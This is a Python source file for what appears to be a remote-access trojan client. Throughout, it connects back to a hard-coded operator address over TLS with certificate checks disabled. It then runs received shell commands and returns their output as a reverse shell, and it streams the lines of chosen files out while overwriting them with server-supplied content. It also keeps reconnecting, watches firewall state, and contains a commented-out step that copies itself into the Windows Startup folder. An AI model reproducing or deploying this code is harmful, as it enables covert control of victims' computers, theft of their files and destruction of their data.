import socket as so
import os
import subprocess as sp
import shutil
import time
import sys
import paramiko as pa
import ssl
import threading as thr
try:
    
    
    pwd=os.getcwd()
    pla=sys.platform

    # if pla=="win32" or pla=="win64":
    #     try:
    #         shutil.move("clint.exe",r"C:\Users\ibrah\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    #     except Exception:
    #         pass
     
    

    while True:
         
        try:
            cont=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            cont.check_hostname=False
            cont.verify_mode=ssl.CERT_NONE
            with so.create_connection(('192.168.1.13',12345)) as sz:
                with cont.wrap_socket(sz,server_hostname='192.168.1.13') as sst:
                    t=sst.recv(4096).decode('utf-8')
                    if t=="connected":
                        if pla=='linux' or pla=='win32' or pla=='win64':
                            pla=str(pla) 
                            sst.sendall(pla.encode('utf-8'))
                            
                        
                        else:   
                            sst.sendall("strange platform".encode('utf-8'))
                            #os.remove("clint.exe")
                            gtp=0
                            break
                            
        
                    while True:
                        
                        try:
                            
                                
                            v=sst.recv(4096).decode('utf-8')
                            
                            if v == 'remove':
                                
                                gtp=0



                            elif v=="killcon":
                                gtp=0
                                break
                            elif v==".enf":
                                
                                re=sst.recv(4096).decode('utf-8')
                                speed=sst.recv(4096).decode('utf-8')
                                if re=="1":
                                    continue
                                try:
                                    with open(re, "r",encoding='utf-8') as f:
                                        lines=f.readlines()
                                        l=0
                                        
                                        for k in lines:
                                            l+=1
                                            
                                        ll=str(l)
                                        
                                        sst.sendall(ll.encode('utf-8'))
                                except FileNotFoundError:
                                    sst.sendall("00".encode('utf-8'))
                                    
                                    continue
                                with open(re, "w",encoding='utf-8') as f:
                                    
                                    for line in lines:
                                        speed=int(speed)
                                        time.sleep(speed)
                                        sst.sendall(line.strip().encode('utf-8'))
                                        respons = sst.recv(4096).decode('utf-8')
                                        
                                        f.write(respons)
                                        f.write("\n")






                            elif v==".def":
                                file=sst.recv(4096).decode('utf-8')
                                speed=sst.recv(4096).decode('utf-8')
                                if file=="":
                                    continue
                                try:
                                    with open(file, "r",encoding='utf-8') as f:
                                        lines=f.readlines()
                                        l=0
                                        for k in lines:
                                            l+=1
                                        lin=str(l)
                                        
                                        sst.sendall(lin.encode('utf-8'))
                                except FileNotFoundError:
                                    sst.sendall("00".encode('utf-8'))
                                    
                                    continue
                                with open(file, "w",encoding='utf-8') as f:
                                    
                                    for line in lines:
                                        speed=int(speed)
                                        time.sleep(speed)
                                        sst.sendall(line.strip().encode('utf-8'))
                                        
                                        respons = sst.recv(4096).decode('utf-8')
                                        
                                        f.write(respons)
                                        f.write("\n")






                            elif v=="cmd":
                                ee=0
                                if pla=='linux' :
                                    while True:

                                        command=sst.recv(4096).decode('utf-8')
                                        if command=="exit":
                                            break
                                        
                                        a=sp.run(command,shell=True,text=True,capture_output=True)
                                        if a.returncode==1:
                                            a="abok"
                                            sst.sendall(a.encode('utf-8'))
                                            continue
                                        if command=="cd.." or command.startswith("cd "):
                                            continue
                                        s=a.stdout
                                        sst.sendall(s.encode('utf-8'))




                                elif pla=='win32' or pla=='win64':
                                    while True:
                                        command=sst.recv(4096).decode('utf-8')
                                        
                                        if command=="netsh advfirewall set allprofiles state offf":
                                            
                                            def stop():
                                                global qw,ee
                                                while True:
                                                    time.sleep(10)
                                                    qw=sp.run("netsh advfirewall show allprofiles",shell=True,text=True,capture_output=True)
                                                    qw=qw.stdout
                                                    if len(qw)==2094:
                                                        
                                                        ee=1
                                                        break
                                            thr.Thread(target=stop).start()
                                            
                                        if command=="exit": 
                                            break


                                        if command.startswith("cd "):
                                            nvn=command[3:]
                                            svs=os.path.abspath(os.path.join(pwd,nvn))
                                            pwd=svs

                                            fvf=sp.run(command,cwd=pwd,text=True,shell=True,capture_output=True)
                                            
                                            if fvf.returncode==1:
                                                fvf="abok"
                                                sst.sendall(fvf.encode('utf-8'))
                                                continue
                                            if command=="cd.." or command.startswith("cd "):
                                                continue
                                            if ee==1:
                                                sst.sendall("firewall is on".encode('utf-8'))
                                                continue
                                            if ee==0:
                                                vvv=fvf.stdout
                                                sst.sendall(vvv.encode('utf-8'))
                                        elif command=="cd..":
                                            nvn=pwd
                                            qnvn=nvn.split('\\')

                                            qnvn.pop(-1)
                                            lnvn=-1
                                            dnvn=len(qnvn)
                                            for i in range(dnvn):
                                                lnvn+=2
                                                qnvn.insert(lnvn,'\\')

                                            qqq=''.join(map(str,qnvn))

                                            svs=os.path.abspath(os.path.join(pwd,qqq))

                                            pwd=svs

                                            gvg=sp.run(command,cwd=pwd,text=True,shell=True,capture_output=True)
                                            
                                            if gvg.returncode==1:
                                                gvg="abok"
                                                sst.sendall(gvg.encode('utf-8'))
                                                continue
                                            command=str(command)
                                            if command=="cd.." or command.startswith("cd "):
                                                continue
                                            if ee==1:
                                                sst.sendall("firewall is on".encode('utf-8'))
                                                continue
                                            if ee==0:
                                                vvv=gvg.stdout
                                                sst.sendall(vvv.encode('utf-8'))
                                        else:
                                            wvw=sp.run(command,cwd=pwd,text=True,shell=True,capture_output=True)
                                            
                                            if wvw.returncode==1:
                                                wvw="abok"
                                                sst.sendall(wvw.encode('utf-8'))
                                                continue
                                            if command=="cd.." or command.startswith("cd "):
                                                continue
                                            vvv=wvw.stdout
                                            
                                            if ee==1:
                                                sst.sendall("firewall is on".encode('utf-8'))
                                                
                                                continue
                                            if ee==0:
                                                
                                                sst.sendall(vvv.encode('utf-8'))
                            elif v=="downlod":
                                command=sst.recv(4096).decode('utf-8')
                                if command=="wevall":
                                    continue
                                


                        except ConnectionAbortedError:
                            # os.remove("clint.exe")
                            
                            gtp=0
                            break
                        except ConnectionRefusedError:
                            # os.remove("clint.exe")
                            
                            gtp=0
                            break
                        except ConnectionError: 
                            # os.remove("clint.exe")
                           
                            gtp=0
                            break
                        except ConnectionResetError:
                            # os.remove("clint.exe")
                            
                            gtp=0
                            break
                        except Exception:
                            
                            # os.remove("clint.exe")
                            
                            gtp=0
                            break
        except Exception: 
            time.sleep(10)
            continue
        if gtp==0:
            file_path=os.path.realpath(sys.argv[0])
            break
        
        
except Exception: 
    pass
    # os.remove("clint.exe")

